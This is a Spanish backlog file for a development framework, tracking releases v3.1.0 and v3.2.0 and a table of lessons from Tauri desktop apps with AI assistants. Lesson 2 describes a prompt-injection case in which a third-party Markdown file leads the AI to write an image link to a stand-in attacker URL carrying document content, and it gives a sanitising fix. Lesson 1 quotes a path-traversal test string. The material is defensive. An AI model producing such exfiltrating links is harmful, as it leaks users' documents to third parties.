# Backlog - dbv-specs-ops v3.2.0 (One AI Guide) · v3.1.0 (Phase Graph & Rejection Memory)

## v3.2.0 — Guía de IA única y agentes ACP al día (2026-10-29)

- [x] Plantillas `docs/templates/IA*.template.md` reescritas como guía única para todas las apps DBV (marca `<!-- dbv-ia:fin-guia-comun`), con Antigravity (`agy_acp_server`), Codex (`@agentclientprotocol/codex-acp`), Gemini CLI (`--acp`), Copilot (lanzador de VS Code) e inicio de sesión ACP.
- [x] `AI_DESKTOP_ARCHITECTURE.md`, `MASTER_PROMPT.md` (`/ship`), `UPGRADE_PROMPT.md` (manifiesto v3.2.0), README, `project.config.md`, CHANGELOG (ES/EN) y `memory.md`.
- [x] Verificado de punta a punta en `dbv-tauri-starter` (`template-v0.4.0`): Claude Code, Codex, Antigravity y Copilot conversando en la app real.
- [ ] Las 12 lecciones de la cosecha 2026-10-19 (abajo) **no entran en la v3.2.0**: quedan para la siguiente.

## Contexto del Proyecto (Context Snapshot)
* **Objetivo**: Tomar de *Procedural Graphs* (arXiv:2609.09153) solo lo que mejora el SDD sin la infraestructura del paper, verificarlo de forma determinista y con la IA real, y documentarlo con honestidad (comparativas, referencias y enlace al paper).
* **Estado actual**: IMPLEMENTADA Y VERIFICADA en el árbol de trabajo (scripts en Windows/Linux/Python 3.8 y tres pruebas con `claude -p`: Rejection Memory en `/plan`, creación de la sección en un proyecto antiguo y actualización v3.0.0 → v3.1.0). Pendiente de commit y tag por el usuario.
* **Última decisión técnica**: El grafo es la fuente única; los bloques de `.claude/commands/` se generan y el linter vigila que no diverjan. `MASTER_PROMPT.md` solo lleva un puntero. No se adopta la auto-evolución automática (REJECTED-05 en `memory.md`).
* **Próximo paso**: Revisar `git diff --stat`, commit `Version v.3.1.0` y tag `v3.1.0`.

## Checklist de Tareas

- [x] **Fase 1: Diagnóstico del borrador** — contrastado con el PDF del paper (cifras correctas, pero aplicadas a configuraciones que el paper no midió) y su código ejecutado en el scratchpad (fallos en Windows, regla de un `return`, Python 3.10+, validador permisivo, regresiones en `run-evals.sh`).
- [x] **Fase 2: Grafo y motor** — `docs/PROCEDURAL_GRAPH.json` (10 nodos, 16 transiciones con vueltas atrás) y `scripts/pg-guide.py` (validación, contexto por fase, generación y comprobación de comandos).
- [x] **Fase 3: Comandos y linter** — bloques generados en los 7 comandos; `dbv-lint.py` valida el grafo y la sincronía (error en el framework, aviso en la raíz del consumidor).
- [x] **Fase 4: Rejection Memory** — `MASTER_PROMPT.md` (`<procedural_graph>` + disparadores), `memory.md` (5 entradas reales) y `memory.template.md`.
- [x] **Fase 5: Maintain y evals** — regla de la cola del log, resumen `PASA/TOTAL` en `run-evals.sh` (sin perder protecciones) y regla de no regresión.
- [x] **Fase 6: Documentación** — `PROCEDURAL_GRAPHS.md`, `AGENTIC_ENGINEERING.md` §6, `docs/README.md`, `GUARDRAILS.md`, `UPGRADE_PROMPT.md` (manifiesto v3.1.0, URLs, `chmod`).
- [x] **Fase 7: README y comparativas** — versión 3.1.0, características, pilar 8 y referencias con enlace al paper, dos filas contrastadas con Spec Kit/BMAD/Kiro (16/10/2026), §9 y limitación nueva en `COMPARISON*.md`.
- [x] **Fase 8: Verificación** — ver `walkthrough.md`.
- [x] **Fase 9: Cierre** — `CHANGELOG.md` `[3.1.0] — 2026-10-16` (incluye la comparativa que estaba en `[Sin publicar]`), `memory.md`, `task.md`, `walkthrough.md`, borrador archivado en `old/`.
- [x] **Publicada:** commit `Version 3.1.0`, tag `v3.1.0` y push.

## 📥 Lecciones pendientes de incorporar al framework (cosecha 2026-10-19)

> **Origen:** el ciclo v0.18.0 «AI Native» de `dbv-md-reader` (IA opcional, sincronización edición ↔ vista previa, imágenes pegadas) y la puesta al día de `dbv-tauri-starter` (`template-v0.3.0`). Cada punto es una cosa que **falló o estuvo a punto de fallar de verdad**, no una buena práctica genérica. Detalle y números de lección en `dbv-md-reader/dbv-specs-ops/memory.md` (Lecciones 33, 34 y 35, ADR-048, ADR-049, REJECTED-01 a 05) y en `dbv-tauri-starter/dbv-specs-ops/memory.md` (ADR-035). **A tener en cuenta en la próxima actualización del framework** (`/upgrade`, MASTER_PROMPT, REVIEW y los docs de escritorio/IA).

| # | Lección | Dónde recogerla | Evidencia |
| --- | --- | --- | --- |
| 1 | **Los escapes con barra invertida se corrompen al pasar por un script de shell, un heredoc o `python -c`** (`\n`, `\\`, `\?`, expresiones regulares y rutas de Windows). Reaparece una y otra vez; la vez que importó, una regex de rutas perdió una barra y un test de seguridad dejó pasar `a\..\..\x.md`. **Regla:** el código con barras invertidas se escribe con las herramientas de fichero (`Write`/`Edit`), nunca por un heredoc ni una línea de shell; si hay que generar ficheros con un script, el script va en un fichero y se verifica con un test. | `AGENTIC_ENGINEERING.md` (reglas de uso de herramientas), `MASTER_PROMPT.md` (`<coding_standards>`), `REVIEW.md` (pase de Bugs: «¿hay barras invertidas escritas por shell?») | `dbv-md-reader` Lección 33 |
| 2 | **La salida de un modelo de IA no se pinta con el render de documentos: exfiltración por imagen Markdown.** Un `.md` de un tercero puede inducir a la IA a escribir `![x](https://atacante/?q=<contenido>)`; el navegador pide la URL en cuanto aparece la `<img>`. **Reemplazar la imagen después de `innerHTML` no sirve** (la petición ya salió, medido): hay que sanear **antes** de crear el DOM (DOMPurify con `FORBID_TAGS`/`FORBID_ATTR`) o construir nodos con `textContent` (como hace `markdown.js` del starter). Incluye el atributo `style` con `url()`. | `AI_DESKTOP_ARCHITECTURE.md` (seguridad), `GUARDRAILS.md`, `REVIEW.md` (pase de Seguridad), Rejection Memory | `dbv-md-reader` Lección 34, REJECTED-02 (hallazgo **Crítico** de `/code-simplify`) |
| 3 | **`fs::canonicalize` de Windows devuelve `\\?\D:\…`**, y comparar esa ruta con la que manda un agente (`D:\…`) hace que todo «salga de la carpeta». En la práctica: un agente veía denegada, **sin preguntar**, cada escritura. **Regla:** toda ruta que viaje de Rust a un agente o a una comparación de cadenas pasa por una normalización que quita el prefijo (también `\\?\UNC\`); y lo que **deniega sin preguntar** debe dejar a la vista la ruta rechazada. | `NATIVE_DESKTOP_APPS.md` (gotchas de Windows) y `AI_DESKTOP_ARCHITECTURE.md` (ACP) | `dbv-md-reader` Lección 35 (lo encontró el usuario con una captura) |
| 4 | **Tests dentro de `frontendDist` acaban dentro del ejecutable.** En Tauri sin bundler `frontendDist` es `../src` y se embebe todo lo que haya dentro: los tests van en `tests/` (fuera de `src/`). | `NATIVE_DESKTOP_APPS.md` §3 | `dbv-md-reader` REJECTED-05 |
| 5 | **Un starter que documenta un patrón tiene que ejecutarlo.** La 0.2.0 del starter declaró la IA «completa» con un esqueleto (leer y listar ficheros devolvían vacío, el agente no conversaba, «Aplicar» no aplicaba) y un `SyntaxError` en `i18n.js` que nadie vio, porque ninguna prueba ejercía el recorrido. **Regla:** la prueba mínima es un banco de interfaz que haga el recorrido completo (conectar → conversar → revisar → aplicar → deshacer → guardar). | `AI_DESKTOP_ARCHITECTURE.md`, `NATIVE_APPS_RELEASE_CI.md`/checklist de `/ship` de las plantillas | `dbv-tauri-starter` ADR-035, REJECTED-01 de `dbv-md-reader` |
| 6 | **Banco de interfaz reutilizable:** Edge/Chromium headless (el motor de WebView2) dirigido por CDP, con `window.__TAURI__` simulado y `src/` servido por HTTP (desde `file://` Chromium bloquea el `import()` de módulos). Cazó bugs que los tests de Node no ven (CRLF, exfiltración, foco, menús). Ya existe en `dbv-md-reader/scripts/e2e/harness.mjs` y en el starter. **Candidato a plantilla del framework**, con la regla «una regresión se verifica rompiéndola». | `NATIVE_DESKTOP_APPS.md` (nueva sección de pruebas), plantilla en `docs/templates/` | `dbv-md-reader` `scripts/e2e/`, `dbv-tauri-starter` `scripts/e2e/` |
| 7 | **Escribir ficheros desde una IA en Windows:** (a) el modelo propone con `\n` y el documento trae CRLF → leer con LF y **restaurar** el final de línea al escribir; (b) el renombrado atómico falla si otro programa tiene el destino abierto → caer a escritura directa; (c) los errores de disco **nombran el fichero** (`os error 5` a secas no ayuda a nadie). | `AI_DESKTOP_ARCHITECTURE.md` | `dbv-md-reader` CHANGELOG 0.18.0 «Corregido» |
| 8 | **El menú nativo del WebView tiene un «Actualizar» que recarga TODA la página** y se pierde el documento, la edición y la conversación. Bloquear `contextmenu` fuera de los campos de texto (no en Android, donde la pulsación larga usa ese evento para seleccionar) y ofrecer menús propios con «Copiar». | `NATIVE_DESKTOP_APPS.md` §6 (gotchas) | `dbv-md-reader` 0.18.0 (lo encontró el usuario) |
| 9 | **Listas y árboles que se leen bajo demanda no se enteran de lo que la propia app escribe** (la carpeta `images/` recién creada no aparecía hasta reabrir). Toda acción que escribe en disco refresca la vista que lo muestra, y hay un «Actualizar» manual. | `NATIVE_DESKTOP_APPS.md` o `REVIEW.md` (pase de Bugs) | `dbv-md-reader` 0.18.0 |
| 10 | **Agentes ACP: ni un agente «a medida» con una orden libre** (ejecución arbitraria desde IPC en una app que renderiza contenido de terceros) **ni confiar en que lo escrito por el agente pase por la propuesta**: foto de restauración por turno y «Deshacer». | `AI_DESKTOP_ARCHITECTURE.md` | `dbv-md-reader` REJECTED-03 |
| 11 | **Excepción documentada a «sin módulos ES» en Tauri sin bundler:** el código de la IA son módulos ES cargados con `import()` bajo demanda (cero huella), mientras el resto de la app sigue siendo scripts clásicos con IIFE. Funciona en WebView2; **sin verificar en WebKitGTK/WKWebView** (riesgo aceptado, ADR-048). El framework debe decir cuándo vale la excepción y cómo verificarla en Linux/macOS. | `MASTER_PROMPT.md` (`<coding_standards>`) y `NATIVE_DESKTOP_APPS.md` §3 | `dbv-md-reader` ADR-048 |
| 12 | **Honestidad en las tiendas con una IA opcional:** la política de privacidad y las fichas (Microsoft Store, Uptodown, Homebrew) se actualizan **antes** de publicar para decir que, solo si el usuario lo activa, el texto del documento puede enviarse al proveedor que él elija; y la ficha no puede seguir diciendo «tus documentos nunca salen de tu equipo». | `MARKETPLACE_PUBLISHING.md`, `MICROSOFT_STORE.md` | `dbv-md-reader` RNF-IA.9 |

**Cómo se cierra esto:** en la próxima actualización (la v3.2.0 se centró en la guía de IA; será la siguiente), cada fila se convierte en una regla concreta en el documento que indica la tercera columna (con su entrada en la Rejection Memory cuando haya un enfoque descartado) y se marca aquí como hecha. Las filas 1 y 2 son las de mayor riesgo: la 1 se repite en cada sesión y la 2 fue un hallazgo Crítico.

## Deuda Técnica
- `evals/` tiene un solo eval: la regla de no regresión y cualquier medición del efecto del grafo necesitan una suite real (15-30 tareas, una por fase como mínimo). Es también la condición para reabrir REJECTED-05.
- `MASTER_PROMPT.md` ha crecido de 35,2 a 38,5 KB con el bloque `<procedural_graph>`; vigilar el tamaño en próximas versiones.
- La actualización v3.0.0 → v3.1.0 se probó con un espejo local de `master`: al publicar, repetirla contra las URL de GitHub.
- El tag `v2.8.0` no existe en git (hay `v2.7.0` y `v2.9.0`), aunque el `CHANGELOG.md` enlaza `compare/v2.7.0...v2.8.0`.
- El snippet de `.windsurfrules` del Paso 2 de los README está en formato JSON, mientras el `.windsurfrules` del repo es Markdown plano; no se ha verificado cuál es el formato correcto de Windsurf.

---

## 🔄 Context Snapshot / Snapshot de Contexto

> **Last update / Última actualización:** 2026-10-16
> **Exact point / Punto exacto:** Release v3.1.0 completa y verificada (deterministas + IA real). Sin commit ni tag.
> **Pending / Pendiente:** Commit `Version v.3.1.0`, tag `v3.1.0` y push (acciones del usuario); tras publicar, repetir la actualización contra GitHub.
> **Next step / Próximo paso:** `git status` y `git diff --stat` para revisar el conjunto antes del commit.
